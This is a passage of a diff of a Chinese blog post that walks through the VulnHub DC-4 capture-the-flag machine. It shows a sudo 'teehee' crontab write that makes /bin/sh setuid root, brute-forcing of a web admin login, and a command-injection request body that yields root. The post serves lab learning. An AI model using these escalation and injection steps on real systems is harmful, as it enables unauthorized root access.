+<pre class="line-numbers language-bash"><code class="language-bash">charles@dc-4:/var/mail$ <span class="token function">sudo</span> teehee /etc/crontab
+* * * * * root <span class="token function">chmod</span> 4777 /bin/sh
+* * * * * root <span class="token function">chmod</span> 4777 /bin/sh
+^C
+charles@dc-4:/var/mail$ /bin/sh
+<span class="token comment" spellcheck="true"># cd /root</span>
+<span class="token comment" spellcheck="true"># ls</span>
+flag.txt
+<span class="token comment" spellcheck="true"># cat flag.txt</span>
 
 
 
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  <span class="token string">"Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="token string">"88b 888 "</span>88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88<span class="token punctuation">..</span>88P 888  888 Y8b.      <span class="token string">"   "</span>   <span class="token string">"   "</span>
+888P     Y888  <span class="token string">"Y8888  888 888      8888888P"</span>   <span class="token string">"Y88P"</span>  888  888  "Y8888  888 888 888 888
 
-Once again, a big thanks to all those who do these little challenges,
-and especially all those who give me feedback - again, it'</span>s all greatly
-appreciated.  :-<span class="token punctuation">)</span>
 
-I also want to send a big thanks to all those <span class="token function">who</span> <span class="token function">find</span> the vulnerabilities
-and create the exploits that <span class="token function">make</span> these challenges possible.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得到了 <code>flag</code></p>
+Congratulations<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+<span class="token function">who</span> have provided feedback, and <span class="token function">who</span> have taken <span class="token function">time</span> to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Additions："><a href="#Additions：" class="headerlink" title="Additions："></a>Additions：</h2><p>可以发现到这还没有用到过 <code>Web</code> 服务，于是反过头来看一下 <code>Web</code> 服务</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtLKfJ.png">
+
+<p>发现是一个后台，尝试登录一下</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtqJiQ.png">
+
+<p>尝试了几次，没有限制，又由于提示是 <code>Admin Infomation Systems Login&#39;</code> ，所以这里默认使用 <code>admin</code> 这个账号，然后开始爆破</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtOwUU.png">
+
+<p>设置好攻击载荷后开始攻击</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtOdET.png">
+
+<p>这里看到了有一个不同长度的</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtOUbV.png">
+
+<p>使用这个密码登录进去看一下.</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtqmRA.png">
+
+<p>看起来是一个工具管理系统，然后点进去发现是命令执行的工具</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtqnxI.png">
+
+<p>抓包分析一下，可以发现只是单纯的使用 <code>+</code> 号拼接起来的</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtqYGj.png">
+
+<p>构造语句如下：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">radio<span class="token operator">=</span>whoamil<span class="token operator">&amp;</span>submit<span class="token operator">=</span>Run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/04/22/Jtq8Ig.png">
+
+<p>可以看到，获取到的直接就是 <code>root</code> 权限，那 <code>flag</code> 信息就能直接看到了</p>
+<img src="https://s1.ax1x.com/2020/04/22/JtqNzn.png">
+
+<p>如果设置两个变量爆破也是可以的</p>
+<img src="https://s1.ax1x.com/2020/04/22/Jtq1Z8.png">
+
+<img src="https://s1.ax1x.com/2020/04/22/Jtq3dS.png">
+
+<p>这里不知道是不是靶机有问题，很多以 <code>happy</code> 为密码的用户都登录进去了…..</p>
 
             </div>
             <hr/>
@@ -721,7 +714,7 @@ and create the exploits that <span class="token function">make</span> these chal
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://valecasec.github.io/2020/04/24/shen-tou-ce-shi-dc5/">https://valecasec.github.io/2020/04/24/shen-tou-ce-shi-dc5/</a>
+                    <a href="https://valecasec.github.io/2020/04/24/shen-tou-ce-shi-dc4/">https://valecasec.github.io/2020/04/24/shen-tou-ce-shi-dc4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -763,8 +756,8 @@ and create the exploits that <span class="token function">make</span> these chal
                                     <span class="chip bg-color">Penetration_Test</span>
                                 </a>
                             
-                                <a href="/tags/VulnHub/">
-                                    <span class="chip bg-color">VulnHub</span>
+                                <a href="/tags/Command-execution/">
+                                    <span class="chip bg-color">Command execution</span>
                                 </a>
                             
                         </div>
@@ -1074,19 +1067,19 @@ and create the exploits that <span class="token function">make</span> these chal
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/04/25/vulnerable-win2k3/">
+                <a href="/2020/04/25/shen-tou-ce-shi-dc5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Vulnerable—Win2k3">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="渗透测试—DC5">
                         
-                        <span class="card-title">Vulnerable—Win2k3</span>
+                        <span class="card-title">渗透测试—DC5</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            渗透测试的个人学习记录，由于靶机的问题导致这篇文章变成了水文...
+                            渗透测试之DC_5的个人学习记录，在头发变少的路上越走越远...
                         
                     </div>
                     <div class="publish-info">
@@ -1112,8 +1105,8 @@ and create the exploits that <span class="token function">make</span> these chal
                         <span class="chip bg-color">Penetration_Test</span>
                     </a>
                     
-                    <a href="/tags/IIS-6-0/">
-                        <span class="chip bg-color">IIS 6.0</span>
+                    <a href="/tags/VulnHub/">
+                        <span class="chip bg-color">VulnHub</span>
                     </a>
                     
                 </div>
@@ -1127,19 +1120,19 @@ and create the exploits that <span class="token function">make</span> these chal
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/04/23/scapy-syn-sao-miao/">
+                <a href="/2020/04/23/shen-tou-ce-shi-dc3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Scapy—SYN扫描">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="渗透测试—DC3">
                         
-                        <span class="card-title">Scapy—SYN扫描</span>
+                        <span class="card-title">渗透测试—DC3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            TCP半连接扫描之SYN扫描，这里只作为个人Scapy学习的一个记录...
+                            渗透测试之DC_3的个人学习记录，在头发变少的路上越走越远...
                         
                     </div>
                     <div class="publish-info">
@@ -1150,8 +1143,8 @@ and create the exploits that <span class="token function">make</span> these chal
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Scapy/" class="post-category">
-                                    Scapy
+                            <a href="/categories/Penetration-Test/" class="post-category">
+                                    Penetration_Test
                                 </a>
                             
                             
@@ -1161,12 +1154,12 @@ and create the exploits that <span class="token function">make</span> these chal
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Scapy/">
-                        <span class="chip bg-color">Scapy</span>
+                    <a href="/tags/Penetration-Test/">
+                        <span class="chip bg-color">Penetration_Test</span>
                     </a>
                     
-                    <a href="/tags/SYN%E6%89%AB%E6%8F%8F/">
-                        <span class="chip bg-color">SYN扫描</span>
+                    <a href="/tags/VulnHub/">
+                        <span class="chip bg-color">VulnHub</span>
                     </a>
                     
                 </div>
